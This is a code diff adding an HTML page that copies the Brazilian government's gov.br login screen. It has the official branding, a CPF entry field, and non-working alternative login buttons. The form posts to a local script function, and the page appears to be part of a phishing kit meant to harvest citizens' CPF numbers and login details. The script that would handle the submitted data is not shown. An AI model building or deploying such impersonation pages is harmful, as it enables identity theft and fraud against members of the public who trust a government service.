@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gov.br - Acesse sua conta</title>
+    <link rel="icon" type="image/svg+xml" href="favicon_rr.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="css/govbr.css">
+</head>
+<body>
+    <header>
+        <a href="#"><img src="images/govbr.png" alt="Logomarca GovBR"></a>
+        <div id="acessibilidade">
+            <span>
+                <a href="#"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+            </span>
+            <span>
+                <a href="#"><i class="fas fa-deaf"></i><span>VLibras</span></a>
+            </span>
+        </div>
+    </header>
+
+    <div class="container">
+        <aside id="aside-signin">
+            <img id="identidade-govbr" src="images/conta_govbr_v2_defeso-eleitoral.jpg" alt="Identificação GovBR">
+        </aside>
+        <main id="main-signin">
+            <form method="post" id="loginData" onsubmit="login(); return false;" autocomplete="off">
+                <div class="card" id="login-cpf">
+                    <h3>Identifique-se no gov.br com:</h3>
+                    
+                    <div class="item-login-signup-ways" style="margin-bottom: 10px;">
+                        <a><i class="fas fa-id-card" style="margin-right: 8px; color: #1351b4;"></i>Número do CPF</a>
+                    </div>
+                    
+                    <div class="accordion-panel" style="width: 100%;">
+                        <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p>
+                        <label for="cpfInput">CPF</label>
+                        <input id="cpfInput" name="accountId" autocomplete="off" tabindex="1" type="tel" inputmode="numeric" value="" placeholder="Digite seu CPF">
+                        
+                        <div class="button-panel" id="login-button-panel">
+                            <button id="enter-account-id" type="submit" class="button-continuar" tabindex="2">Continuar</button>
+                        </div>
+                    </div>
+
+                    <label id="title-outras-op" style="margin-top: 10px; font-weight: normal; font-size: 14px;">Outras opções de identificação:</label>
+                    <hr id="hr-outras-op">
+
+                    <div class="item-login-signup-ways">
+                        <button type="button" class="button-href-mimic2" style="color:#008C32">
+                            <i class="fas fa-university" style="margin-right: 8px;"></i>
+                            Login com seu banco
+                            <span class="badge-prata">SUA CONTA SERÁ PRATA</span>
+                        </button>
+                    </div>
+
+                    <div class="item-login-signup-ways">
+                        <button type="button" class="button-href-mimic2">
+                            <i class="fas fa-qrcode" style="margin-right: 8px; color: #1351b4;"></i>
+                            Login com QR code
+                        </button>
+                    </div>
+
+                    <div class="item-login-signup-ways">
+                        <button type="button" class="button-href-mimic2">
+                            <i class="fas fa-certificate" style="margin-right: 8px; color: #1351b4;"></i>
+                            Seu certificado digital
+                        </button>
+                    </div>
+
+                    <div class="item-login-signup-ways">
+                        <button type="button" class="button-href-mimic2">
+                            <i class="fas fa-cloud" style="margin-right: 8px; color: #1351b4;"></i>
+                            Seu certificado digital em nuvem
+                        </button>
+                    </div>
+
+                    <div class="entenda-id-govbr">
+                        <span>
+                            <a href="#" id="entenda-id-govbr-a">
+                                <i class="fas fa-question-circle" style="margin-right: 5px;"></i>
+                                Está com dúvidas e precisa de ajuda?
+                            </a>
+                            <a href="#" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a>
+                        </span>
+                    </div>
+                </div>
+            </form>
+        </main>
+    </div>
+
+    <script src="js/app.js"></script>
+</body>
+</html>
